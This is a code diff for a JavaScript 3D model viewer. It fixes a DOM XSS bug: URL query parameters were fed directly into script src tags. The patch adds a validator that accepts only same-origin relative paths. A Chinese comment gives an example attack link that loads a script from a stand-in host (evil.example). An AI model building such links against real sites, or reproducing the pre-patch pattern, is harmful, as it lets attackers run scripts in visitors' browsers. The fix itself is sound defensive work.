@@ -78,21 +78,49 @@
 
   /* ---------- 每个实例 ---------- */
 
+  /* 🔴 覆盖值只接受**同源相对路径**。
+     ------------------------------------------------------------------------
+     原来 mv / three / gltf / orbit 四个查询参数的值直接进 loadScript 的
+     `<script src>` ⇒ 构造 `?three=https://evil.example/x.js` 的链接，
+     访问者点一次"加载"就在本站源里执行任意脚本（DOM XSS）。
+     SECURITY.md 的 sink 表也没登记这一面 —— 它当时只盯着 innerHTML。
+
+     拒绝：任何 scheme（javascript: / data: / https:）、协议相对（//host）、
+           反斜杠（浏览器把 \ 当 / 用）、控制字符。
+     保留：普通相对路径（vendor/x.js）与同源根相对（/assets/x.js）——
+           文档里的降级演示用的正是这两种，安全且零破坏。 */
+  function safeOverride(v) {
+    if (typeof v !== 'string' || v === '') return false;
+    if (/^[a-z][a-z0-9+.\-]*:/i.test(v)) return false;
+    if (v.charAt(0) === '/' && v.charAt(1) === '/') return false;
+    if (v.indexOf('\\') >= 0) return false;
+    if (/[\u0000-\u001f\u007f]/.test(v)) return false;
+    return true;
+  }
+
   function Viewer(node) {
     this.node = node;
     /* 🔴 支持 URL 查询参数覆盖（便于测试降级路径，不必改代码）：
-         ?mv=NOPE.glb&three=vendor/x.js  ⇒ 模拟「模型/引擎 404」 */
+         ?mv=NOPE.glb&three=vendor/x.js  ⇒ 模拟「模型/引擎 404」
+       值一律过 safeOverride —— 绝对 URL 会被**忽略**并退回 data-* 的默认值，
+       而不是"报个错继续用"。 */
     var q = (location.search || '').replace(/^\?/, '');
+    var overrode = false;
     function qp(k, dflt) {
       var m = new RegExp('(?:^|&)' + k + '=([^&]*)').exec(q);
-      return m ? decodeURIComponent(m[1]) : dflt;
+      if (!m) return dflt;
+      var v;
+      try { v = decodeURIComponent(m[1]); } catch (e) { return dflt; }
+      if (!safeOverride(v)) return dflt;
+      overrode = true;
+      return v;
     }
-    this.qOverride = !!q;
     this.src = qp('mv', node.getAttribute('data-mv') || '');
     this.h = parseInt(node.getAttribute('data-mv-height') || '320', 10);
     this.threeSrc = qp('three', node.getAttribute('data-mv-three') || '');
     this.gltfSrc = qp('gltf', node.getAttribute('data-mv-gltf') || '');
     this.orbitSrc = qp('orbit', node.getAttribute('data-mv-orbit') || '');
+    this.qOverride = overrode;   // 是否有覆盖真的生效（诊断用）
     this.instances = {};       // three 实例（切主题时重建）
     this.state = 'idle';
     this.build();
